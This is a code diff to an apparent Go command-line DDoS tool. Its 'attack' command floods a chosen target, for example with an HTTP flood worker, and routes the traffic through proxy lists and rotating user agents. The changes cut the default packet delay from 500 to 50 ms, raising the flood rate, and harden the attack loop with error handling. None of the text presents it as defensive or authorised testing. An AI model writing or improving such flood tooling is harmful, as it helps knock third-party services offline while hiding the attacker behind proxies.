@@ -41,7 +41,7 @@ func main() {
 	var verbose bool
 	// method and target are positional
 	attackCmd.Flags().IntVar(&duration, "duration", 60, "Duration in seconds")
-	attackCmd.Flags().IntVar(&delay, "delay", 500, "Packet delay in ms")
+	attackCmd.Flags().IntVar(&delay, "delay", 50, "Packet delay in ms")
 	attackCmd.Flags().IntVar(&psize, "packet-size", 512, "Packet size")
 	attackCmd.Flags().BoolVar(&noProxy, "no-proxy", false, "Allow running without proxies")
 	attackCmd.Flags().IntVar(&threads, "threads", 0, "Number of threads (0=NumCPU)")
@@ -51,9 +51,21 @@ func main() {
 	attackCmd.RunE = func(cmd *cobra.Command, args []string) error {
 		method := args[0]
 		target := args[1]
-		cfg, _ := config.Load(*cfgPath)
-		proxies, _ := proxy.LoadProxies(cfg.ProxiesFile)
-		uas, _ := proxy.LoadUserAgents(cfg.UserAgentsFile)
+
+		cfg, err := config.Load(*cfgPath)
+		if err != nil {
+			color.Yellow("Warning: could not load config: %v (using defaults)", err)
+		}
+
+		proxies, err := proxy.LoadProxies(cfg.ProxiesFile)
+		if err != nil && !noProxy {
+			color.Yellow("Warning: could not load proxies from %s: %v", cfg.ProxiesFile, err)
+		}
+
+		uas, err := proxy.LoadUserAgents(cfg.UserAgentsFile)
+		if err != nil {
+			color.Yellow("Warning: could not load user agents from %s: %v", cfg.UserAgentsFile, err)
+		}
 
 		reg := engine.NewRegistry()
 		reg.Register(engine.AttackHTTPFlood, http.NewFloodWorker())
@@ -71,7 +83,12 @@ func main() {
 			return fmt.Errorf("no proxies available")
 		}
 
-		tn, _ := targetpkg.Parse(target)
+		tn, err := targetpkg.Parse(target)
+		if err != nil {
+			color.Red("Invalid target: %v", err)
+			return fmt.Errorf("invalid target: %w", err)
+		}
+
 		params := engine.AttackParams{
 			Target:      target,
 			TargetNode:  tn,
@@ -87,9 +104,11 @@ func main() {
 		defer stop()
 
 		attackID := fmt.Sprintf("cli-%d", time.Now().Unix())
-		statsCh, _ := eng.Start(attackID, ctx, params, filtered, uas)
-		ticker := time.NewTicker(1 * time.Second)
-		defer ticker.Stop()
+		statsCh, err := eng.Start(attackID, ctx, params, filtered, uas)
+		if err != nil {
+			color.Red("Failed to start attack: %v", err)
+			return err
+		}
 
 		color.Cyan("Starting %s against %s with %d proxies", method, target, len(filtered))
 		if verbose {
@@ -101,9 +120,12 @@ func main() {
 				color.Yellow("Stopping...")
 				eng.Stop(attackID)
 				return nil
-			case s := <-statsCh:
-				// print every receipt; throttle visually with ticker
-				<-ticker.C
+			case s, ok := <-statsCh:
+				if !ok {
+					// Channel closed — attack finished
+					color.Green("Attack finished.")
+					return nil
+				}
 				if s.Log != "" && verbose {
 					// Show detailed logs only in verbose mode
 					fmt.Printf("%s PPS:%s Total:%s Proxies:%d %s\n",
